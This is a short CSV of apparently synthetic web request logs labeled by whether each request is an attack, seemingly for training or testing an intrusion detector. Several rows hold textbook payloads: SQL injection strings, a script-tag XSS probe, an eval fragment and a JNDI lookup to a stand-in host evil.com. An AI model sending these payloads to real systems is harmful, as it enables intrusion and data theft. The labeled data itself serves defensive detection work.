request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page3,,Nikto/2.1.6,200,0
GET,/app/page89,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page35,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page6?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page41?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page73?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page47,,sqlmap/1.0,404,0
POST,/app/page27?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
